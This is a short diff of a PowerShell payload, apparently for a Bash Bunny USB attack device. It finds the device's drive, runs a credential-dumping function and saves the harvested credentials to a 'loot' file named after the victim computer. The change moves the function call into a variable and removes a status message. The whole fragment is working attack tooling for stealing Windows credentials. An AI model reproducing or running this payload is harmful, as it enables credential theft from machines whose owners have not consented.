@@ -1,6 +1,6 @@
 ﻿
 
-# _main_ -LOOTDIR "\loot\CredDump" -APPEND "false"
+#_main_ -LOOTDIR "\loot\CredDump" -APPEND "false"
 
 #################### MAIN ##########################
 function _main_
@@ -9,7 +9,8 @@ param(
     [string]$LOOTDIR="\loot\DumpCreds",
     [String]$APPEND="false"
     )
-
+# Function to run
+$FUNC = "Get-Creds"
 
     
     $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
@@ -23,12 +24,11 @@ param(
 
         $OUT="$Bunny\$LOOTDIR\$env:computername.txt"
         if ($append -eq "true" ) {
-            Get-Creds |Out-File -Append $OUT
+            & $FUNC |Out-File -Append $OUT
         } else {
-            Get-Creds |Out-File $OUT
+            & $FUNC |Out-File $OUT
         }
     } else {
-        echo "No Bunny insert"
         exit
     }
 
